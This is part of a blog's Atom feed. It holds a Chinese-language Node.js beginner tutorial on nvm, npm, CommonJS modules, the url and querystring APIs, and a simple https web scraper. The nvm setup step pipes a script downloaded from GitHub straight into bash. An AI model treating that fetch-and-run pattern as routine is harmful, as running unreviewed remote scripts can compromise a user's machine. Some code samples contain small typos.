&lt;h4 id=&quot;https的作用&quot;&gt;&lt;a href=&quot;#https
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="HTTPS攻击" scheme="http://www.xpshuai.cn/tags/HTTPS%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Node.js 入门</title>
    <link href="http://www.xpshuai.cn/Node-js-%E5%85%A5%E9%97%A8/"/>
    <id>http://www.xpshuai.cn/Node-js-入门/</id>
    <published>2020-03-27T10:18:49.000Z</published>
    <updated>2020-04-28T00:03:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>Node.js是一个机遇Chrome V8引擎的JavaScript运行环境</p><p>Node.js的包管理器npm，是全球最大的开源生态库系统</p><p>Node.js可解析js代码，没有浏览器安全级别的限制</p><h2 id="一-开发环境配置"><a href="#一-开发环境配置" class="headerlink" title="一.开发环境配置"></a>一.开发环境配置</h2><p>官网： <a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a></p><p>API文档：<a href="http://nodejs.cn/api/events.html" target="_blank" rel="noopener">http://nodejs.cn/api/events.html</a></p><h4 id="如果需要安装多个版本"><a href="#如果需要安装多个版本" class="headerlink" title="如果需要安装多个版本"></a>如果需要安装多个版本</h4><p><strong>1).docker</strong></p><p><strong>2).使用nvm来安装并维护（<code>推荐</code>）</strong></p><p>项目地址：<a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">https://github.com/nvm-sh/nvm</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.安装nvm</span></span><br><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.配置环境变量</span></span><br><span class="line"><span class="comment">#linux下  .bash_profile或.bash_rc</span></span><br><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">"<span class="variable">$([ -z "$&#123;XDG_CONFIG_HOME-&#125;" ] &amp;&amp; printf %s "$&#123;HOME&#125;/.nvm" || printf %s "$&#123;XDG_CONFIG_HOME&#125;/nvm")</span>"</span></span><br><span class="line">[ -s <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> ] &amp;&amp; \. <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> <span class="comment"># This loads nvm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># windows系统。。。</span></span><br></pre></td></tr></table></figure><p>3.配置加速镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同样在上面的配置文件</span></span><br><span class="line"><span class="built_in">export</span> NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node</span><br></pre></td></tr></table></figure><h4 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a><strong>安装node</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装指定版本</span></span><br><span class="line">nvm install 8.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或安装最新的稳定版本</span></span><br><span class="line">nvm install --lts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或安装最新的版本</span></span><br><span class="line">nvm install node</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的版本</span></span><br><span class="line">nvm ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前版本</span></span><br><span class="line">node -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换版本</span></span><br><span class="line">nvm use 6.11.2</span><br></pre></td></tr></table></figure><h4 id="体验一下"><a href="#体验一下" class="headerlink" title="体验一下"></a>体验一下</h4><p>在终端进入node命令行：<code>node</code>, 之后可以输入js代码了</p><p>在终端里面，不用受到浏览器里面的一些限制(但是本地环境没有<code>dom</code>和<code>bom</code>的操作)</p><p>比如，查看本地进程<code>process</code></p><p>执行文件：<code>node index.js</code></p><h6 id="不用每次写完都运行命令来执行"><a href="#不用每次写完都运行命令来执行" class="headerlink" title="不用每次写完都运行命令来执行"></a>不用每次写完都运行命令来执行</h6><p>安装<code>nodemon</code>, 实时侦测文件的变化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install nodemon -g  <span class="comment"># 全局安装</span></span><br></pre></td></tr></table></figure><p>npm使用国内源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 永久</span></span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>或安装使用<code>cnpm</code>命令</p><p>使用<code>nodemon</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nodemon index.js</span><br><span class="line"><span class="comment"># 这样就可以实时侦测了</span></span><br></pre></td></tr></table></figure><p>使用其他版本node来运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.指定版本来运行</span></span><br><span class="line">nvm run 6.1.2 index.js</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.使用配置文件</span></span><br><span class="line">.nvmrc </span><br><span class="line"><span class="comment">#内容直接写版本号，</span></span><br><span class="line">6.1.2</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">nmp use</span><br><span class="line"><span class="comment">#接下来运行就可以了</span></span><br><span class="line">node index.js</span><br></pre></td></tr></table></figure><h2 id="二-模块-包-与CommonJS"><a href="#二-模块-包-与CommonJS" class="headerlink" title="二. 模块(包)与CommonJS"></a>二. 模块(包)与CommonJS</h2><p><img src="/Node-js-入门/commonjs.png" alt></p><h4 id="Node-js三种模块"><a href="#Node-js三种模块" class="headerlink" title="Node.js三种模块"></a>Node.js三种模块</h4><ol><li><p><strong>内置的Node.js模块</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> os = <span class="built_in">require</span>(<span class="string">'os'</span>)  <span class="comment">// require 载入模块</span></span><br><span class="line"><span class="built_in">console</span>.log(os.hostname()); <span class="comment">// 显示主机名</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p><strong>第三方的Node.js模块</strong>(<a href="https://www.npmjs.com" target="_blank" rel="noopener">https://www.npmjs.com</a>)</p><p>​    把包用npm引进来（可以创建配置文件来管理<code>npm init</code>,根据情况填写回撤，会自动创建<code>package.json</code>）</p><p>​    在命令行输入<code>npm install request  --save</code> 安装在配置信息的依赖<code>dependencies</code>里</p><p>​    会在我们的包里面自动创建一个文件夹<code>node_modules</code>, 我们安装的包就会在里面了</p><p>​    载入模块同上</p><p>​    然后开始使用第三方模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>)  <span class="comment">//自动先从自己的模块找，找不到就会到我们目录下配置文件夹下找</span></span><br><span class="line"></span><br><span class="line">request(&#123;</span><br><span class="line">  url: <span class="string">'https://api.douban.com/v2/movies/top250'</span>,</span><br><span class="line">  json:<span class="literal">true</span>,</span><br><span class="line">&#125;, (error, response, body) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringfy(body, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p><strong>自定义的Node.js模块（要按照CommonJS规范）</strong></p><p>新建一个目录<code>src</code>,里面新建一个js文件(模块)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自定义模块</span></span><br><span class="line"><span class="keyword">const</span> hello = <span class="function"><span class="params">()</span> =&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"hello~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//暴露接口供外部使用(第一个hello是模块的名字，第二个hello是要用的方法)</span></span><br><span class="line"><span class="built_in">module</span>.exports.hello = hello</span><br></pre></td></tr></table></figure><p>调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> greet = <span class="built_in">require</span>(<span class="string">"./src/greeting.js"</span>)</span><br><span class="line">greet.hello()</span><br></pre></td></tr></table></figure></li></ol><h2 id="三-NPM-包管理工具"><a href="#三-NPM-包管理工具" class="headerlink" title="三. NPM-包管理工具"></a>三. NPM-包管理工具</h2><h4 id="npm使用"><a href="#npm使用" class="headerlink" title="npm使用"></a>npm使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm -v</span><br><span class="line">npm info</span><br></pre></td></tr></table></figure><p><strong>镜像源</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">npm config get registry</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置</span></span><br><span class="line">npm config <span class="built_in">set</span> registry http://registry.npmjs.org</span><br></pre></td></tr></table></figure><p><strong>升级node</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">npm install n -g</span><br></pre></td></tr></table></figure><p><strong>查看当前目录下安装了哪些node包</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm ls</span><br></pre></td></tr></table></figure><p><strong>查看当前npm用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm whoami</span><br></pre></td></tr></table></figure><p><strong>npm清理缓存</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure><p><strong>npm安装模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># i = install</span></span><br><span class="line">npm i forever -g  <span class="comment"># 全局</span></span><br><span class="line"></span><br><span class="line">npm install xxx   <span class="comment"># 利用 npm 安装xxx模块到当前命令行所在目录；</span></span><br><span class="line">npm install -g xxx  <span class="comment"># 利用npm安装全局模块xxx；</span></span><br><span class="line">npm install xxx  <span class="comment"># 安装但不写入package.json；</span></span><br><span class="line">npm install xxx –save  <span class="comment"># 安装并写入package.json的”dependencies”中；</span></span><br><span class="line">npm install xxx –save-dev <span class="comment"># 安装并写入package.json的”devDependencies”中。</span></span><br></pre></td></tr></table></figure><p><strong>npm 删除模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall xxx     <span class="comment"># 删除xxx模块；</span></span><br><span class="line">npm uninstall -g xxx  <span class="comment"># 删除全局模块xxx；</span></span><br></pre></td></tr></table></figure><p><strong>更新模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure><p><strong>检查模块是否已经过时</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm outdated</span><br></pre></td></tr></table></figure><p>在项目中引导创建一个package.json文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><p> 发布模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure><p>查看node安装路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看node安装路径</span><br></pre></td></tr></table></figure><p><strong>npm scripts</strong></p><p>配置文件中</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">"scripts": &#123;</span><br><span class="line">  "test": "echo \"Error: no test sspecified\" &amp;&amp; exit 1"</span><br><span class="line">  "build": "node async.js"</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>按照上面配置完之后，运行只需：<code>npm run build</code></p><p>优点：</p><ul><li>功能相同，可以使用同一个脚本</li></ul><p>详细的下来查文档</p><h2 id="四-深入浅出Node核心模块API"><a href="#四-深入浅出Node核心模块API" class="headerlink" title="四.深入浅出Node核心模块API"></a>四.深入浅出Node核心模块API</h2><h4 id="1-url"><a href="#1-url" class="headerlink" title="1). url"></a>1). url</h4><blockquote><p>记得要导入模块</p></blockquote><h6 id="1-parse"><a href="#1-parse" class="headerlink" title="1.parse"></a>1.parse</h6><p><code>url.parse(urlStr, [parseQueryString], [slashesDenoteHost])</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url.parse(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line"># 井号后面是hash</span><br><span class="line">url.parse(<span class="string">"https://www.baidu.com:8080/api.php?from=xp&amp;course=node#level"</span>)</span><br><span class="line"></span><br><span class="line">#第二个参数 parseQueryString 为true时将使用查询模块分析查询字符串，默认为false</span><br><span class="line">url.parse(<span class="string">"https://www.baidu.com"</span>， <span class="literal">true</span>)</span><br><span class="line">#第三个参数 如果设置成true，//foo/bar 形式的字符串将被解释成 &#123; host: ‘foo', pathname: ‘/bar' &#125;</span><br><span class="line">url.parse(<span class="string">"https://www.baidu.com"</span>， <span class="literal">true</span>,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><h6 id="2-format"><a href="#2-format" class="headerlink" title="2.format"></a>2.format</h6><p>将一个解析后的URL对象、转成、一个格式化的URL字符串。</p><p><code>url.format(urlObj)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> a = url.format(&#123;</span><br><span class="line">protocol : <span class="string">'http'</span> ,</span><br><span class="line">auth : <span class="literal">null</span> ,</span><br><span class="line">host : <span class="string">'example.com:8080'</span> ,</span><br><span class="line">port : <span class="string">'8080'</span> ,</span><br><span class="line">hostname : <span class="string">'example.com'</span> ,</span><br><span class="line">hash : <span class="literal">null</span> ,</span><br><span class="line">search : <span class="string">'?a=index&amp;t=article&amp;m=default'</span>,</span><br><span class="line">query : <span class="string">'a=index&amp;t=article&amp;m=default'</span>,</span><br><span class="line">pathname : <span class="string">'/one'</span>,</span><br><span class="line">path : <span class="string">'/one?a=index&amp;t=article&amp;m=default'</span>,</span><br><span class="line">href : <span class="string">'http://example.com:8080/one?a=index&amp;t=article&amp;m=default'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出结果：http://example.com:8080/one?a=index&amp;t=article&amp;m=default</span></span><br></pre></td></tr></table></figure><h6 id="3-resolve"><a href="#3-resolve" class="headerlink" title="3.resolve"></a>3.resolve</h6><p>为URL或 href 插入 或 替换原有的标签，两段解析成一个完整的url</p><p><code>url.resolve(from, to)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> a = url.resolve(<span class="string">'/one/two/three'</span>, <span class="string">'four'</span>) ,</span><br><span class="line">b = url.resolve(<span class="string">'http://example.com/'</span>, <span class="string">'/one'</span>),</span><br><span class="line">c = url.resolve(<span class="string">'http://example.com/one'</span>, <span class="string">'/two'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a +<span class="string">","</span>+ b +<span class="string">","</span>+ c);</span><br><span class="line"><span class="comment">//输出结果：</span></span><br><span class="line"><span class="comment">///one/two/four</span></span><br><span class="line"><span class="comment">//http://example.com/one</span></span><br><span class="line"><span class="comment">//http://example.com/two</span></span><br></pre></td></tr></table></figure><h4 id="2-QueryString"><a href="#2-QueryString" class="headerlink" title="2). QueryString"></a>2). QueryString</h4><h6 id="1-querystring-escape-str"><a href="#1-querystring-escape-str" class="headerlink" title="1.querystring.escape(str)"></a>1.querystring.escape(str)</h6><p>转义为url编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">querystring.escape(<span class="string">'&lt;大家好&gt;'</span>)</span><br></pre></td></tr></table></figure><h6 id="2-querystring-unescape-str"><a href="#2-querystring-unescape-str" class="headerlink" title="2.querystring.unescape(str)"></a>2.querystring.unescape(str)</h6><p>反转义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">querystring.unescape(<span class="string">'%3C%E5%A4%A7%E5%AE%B6%E5%A5%BD%3E'</span>)</span><br></pre></td></tr></table></figure><h6 id="3-querystring-stringify-obj-seq-eq-options"><a href="#3-querystring-stringify-obj-seq-eq-options" class="headerlink" title="3.querystring.stringify(obj,[, seq[, eq[, options]]])"></a>3.querystring.stringify(obj,[, seq[, eq[, options]]])</h6><p>序列化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  querystring.stringify(&#123;<span class="attr">name</span>:<span class="string">'chenshuai'</span>,<span class="attr">ago</span>:<span class="number">21</span>,<span class="attr">job</span>:<span class="string">"web"</span>&#125;)</span><br><span class="line"><span class="number">2.</span>   querystring.stringify(&#123;<span class="attr">name</span>:<span class="string">'chenshuai'</span>,<span class="attr">ago</span>:<span class="number">21</span>,<span class="attr">job</span>:<span class="string">"web"</span>&#125;,<span class="string">"."</span>) <span class="comment">//第二个参数可以修改连接的&amp;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> querystring.stringify(&#123;<span class="attr">name</span>:<span class="string">'chenshuai'</span>,<span class="attr">ago</span>:<span class="number">21</span>,<span class="attr">job</span>:<span class="string">"web"</span>&#125;,<span class="string">"."</span>,<span class="string">":"</span>)<span class="comment">//第三个参数可以修改key与value之间的字符串</span></span><br></pre></td></tr></table></figure><h6 id="4-querystring-parse-str-sep-eq-options"><a href="#4-querystring-parse-str-sep-eq-options" class="headerlink" title="4.querystring.parse(str[, sep[, eq[, options]]])"></a>4.querystring.parse(str[, sep[, eq[, options]]])</h6><p>反序列化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// querystring.parse('字符串','&amp;','=') //默认状态(字符串,分隔符,键与值)</span></span><br><span class="line"><span class="number">1.</span> querystring.parse(<span class="string">'name=chenshuai&amp;ago=21&amp;job=web'</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>querystring.parse(<span class="string">'name=chenshuai.ago=21.job=web'</span>,<span class="string">'.'</span>)<span class="comment">//返序列化时要注意格式</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>querystring.parse(<span class="string">'name:chenshuai.ago:21.job:web'</span>,<span class="string">'.'</span>,<span class="string">':'</span>)</span><br></pre></td></tr></table></figure><h4 id="3-http-s-模块"><a href="#3-http-s-模块" class="headerlink" title="3).http(s) 模块"></a>3).http(s) 模块</h4><h6 id="1-get方法"><a href="#1-get方法" class="headerlink" title="1.get方法"></a>1.get方法</h6><p>案例，http小爬虫</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>) <span class="comment">//https网站使用(和http的方法是一样的)</span></span><br><span class="line"><span class="keyword">var</span> cherio = <span class="built_in">require</span>(<span class="string">'cherio'</span>) <span class="comment">// 类似于jQuery</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"https://www.lagou.com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析源代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseMenu</span>(<span class="params">html</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//先导入html，然后再进行处理</span></span><br><span class="line">  <span class="keyword">var</span> $ = cherio.load(html)</span><br><span class="line">  <span class="keyword">var</span> menu = $(<span class="string">'.category-list'</span>)</span><br><span class="line">  <span class="keyword">var</span> menuData = []</span><br><span class="line">  menu.each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123; <span class="comment">//遍历</span></span><br><span class="line">    <span class="keyword">var</span> menuTitle = $(value).find(<span class="string">'h2'</span>).text() <span class="comment">//一级标题</span></span><br><span class="line">    <span class="keyword">var</span> menuLists = $(value).find(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">var</span> menuList = []</span><br><span class="line">    menuLists.each(<span class="function"><span class="keyword">function</span>(<span class="params">inde, val</span>)</span>&#123; <span class="comment">//遍历</span></span><br><span class="line">      menuList.push($(val).text())  <span class="comment">//a元素的text</span></span><br><span class="line">    &#125;)</span><br><span class="line">    menuData.push(&#123;</span><br><span class="line">      menuTitle:menuTitle,</span><br><span class="line">      menuList:menuList</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> menuData</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMenu</span>(<span class="params">menu</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  menu.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(val.menuTitle + <span class="string">'\n'</span>);</span><br><span class="line">    val.menuList.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(value);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get请求</span></span><br><span class="line">https.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> html = <span class="string">''</span>;</span><br><span class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    html += data;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 打印的是网页源代码</span></span><br><span class="line">    <span class="comment">//console.log(html);</span></span><br><span class="line">    <span class="keyword">var</span> result = parseMenu(html)</span><br><span class="line">    printMenu(result)</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  res.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="2-Request方法"><a href="#2-Request方法" class="headerlink" title="2.Request方法"></a>2.Request方法</h6><p>GET获取异步数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Http模块的request方法的get来获取异步数据 豆瓣电影Top250</span></span><br><span class="line"><span class="keyword">const</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  hostname: <span class="string">'douban.uieee.com'</span>,</span><br><span class="line">  port: <span class="number">443</span>,</span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">  path: <span class="string">'/v2/movie/top250'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> responseData = <span class="string">''</span></span><br><span class="line"><span class="keyword">var</span> request = https.request(options, (response) =&gt;&#123;</span><br><span class="line">  response.setEncoding(<span class="string">'utf8'</span>)</span><br><span class="line">  response.on(<span class="string">'data'</span>, (chunk)=&gt;&#123;</span><br><span class="line">    responseData += chunk</span><br><span class="line">  &#125;)</span><br><span class="line">  response.on(<span class="string">'end'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">JSON</span>.parse(responseData).subjects.map(<span 